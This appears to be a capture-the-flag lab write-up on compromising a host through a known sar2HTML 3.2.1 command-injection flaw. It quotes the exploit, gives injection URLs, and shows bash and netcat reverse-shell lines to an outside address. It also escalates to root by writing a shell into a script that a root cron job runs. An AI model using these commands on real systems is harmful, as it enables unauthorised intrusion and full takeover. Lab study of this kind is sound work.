Port 80

Default apache2 web-page

![[Pasted image 20240912041748.png]]

/robots.txt -> sar2HTML
/phpinfo.php -> exposed

I tried the robots.txt data in the url:

![[Pasted image 20240912042958.png]]


```php
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

`192.168.186.35/sar2HTML/index.php?plot=;whoami`

![[Pasted image 20240912045032.png]]

This gives me RCE

```php
GET /sar2HTML/index.php?plot=;ls+/home/local.txt
```

![[Pasted image 20240912045406.png]]

b42704e144c6b9472feae9bffe6cb51d

Rev shell

`GET /sar2HTML/index.php?plot=;nc+192.168.45.250+4444`

This is not working well so i make a bash rev shell instead.

```php
bash -c "bash -i >& /dev/tcp/192.168.45.250/443 0>&1"
```
- Don't forget to terminate the last command with `;` 

Stabalize:

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- CTL + Z

```php
echo $TERM
```

```php
stty -a
```

```php
stty raw -echo && fg
```

```php
export TERM=xterm-256color
```

```php
stty rows 49 columns 129
```

This gives me a stable www.data.

Linpeas:
OS: Linux version 5.0.0-23-generic

Sudo version 1.8.21p2

writable files: /var/lib/systemd + /var/spool/cron/crontabs

Internals 127.0.0.1:631           

*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

This is indicating two interesting .sh files that i found earlier:
`/finally.sh`

```php
cat finally.sh
#!/bin/sh

./write.sh
```

and write.sh:

```php
cat write.sh
#!/bin/sh

touch /tmp/gateway
```

I think i can modify the write file to run a reverse shell as root.

I echo a shell to the `write.sh` file and wait for the finally.sh to use the script.

```php
bash -c "bash -i >& /dev/tcp/192.168.45.250/1337 0>&1"
```

I get the rev shell as root and cat the proof.txt:

![[Pasted image 20240912082851.png]]

I didn't need to look, but there would have been a cron job running that was executing the scripts. I only knew this because of doing so many CTFs now.

---

**Completed:** _08:302024-09-12_

